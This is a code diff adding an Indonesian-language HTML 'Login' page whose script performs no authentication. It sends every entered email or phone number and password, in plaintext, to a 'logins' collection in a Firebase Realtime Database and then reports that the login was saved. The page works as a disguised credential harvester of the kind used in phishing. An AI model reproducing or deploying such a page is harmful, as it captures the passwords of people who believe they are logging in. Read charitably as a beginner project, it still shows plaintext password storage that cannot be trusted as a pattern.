@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+</head>
+<body>
+    <h2>Login</h2>
+    <form id="loginForm">
+        <label>Email / Nomor:</label><br>
+        <input type="text" id="email" required><br><br>
+        <label>Password:</label><br>
+        <input type="password" id="password" required><br><br>
+        <button type="submit">Login</button>
+    </form>
+
+    <script type="module">
+        // Import Firebase SDK
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.3.0/firebase-app.js";
+        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.3.0/firebase-database.js";
+
+        // Konfigurasi Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyDIOjpEtWakfh0WNCDC1iPj9Qm5zKDlaL4",
+            authDomain: "login-24767.firebaseapp.com",
+            databaseURL: "https://login-24767-default-rtdb.firebaseio.com", 
+            projectId: "login-24767",
+            storageBucket: "login-24767.appspot.com",
+            messagingSenderId: "809521846306",
+            appId: "1:809521846306:web:ee8bc0fe4e07584bad127b"
+        };
+
+        // Inisialisasi Firebase
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+        // Fungsi untuk menangani login
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+            let email = document.getElementById("email").value;
+            let password = document.getElementById("password").value;
+
+            // Simpan data login ke Firebase Realtime Database
+            push(ref(database, 'logins'), {
+                email: email,
+                password: password,
+                timestamp: new Date().toISOString()
+            }).then(() => {
+                alert("Login berhasil disimpan.");
+            }).catch(error => {
+                alert("Gagal menyimpan data.");
+                console.error(error);
+            });
+        });
+    </script>
+</body>
+</html>
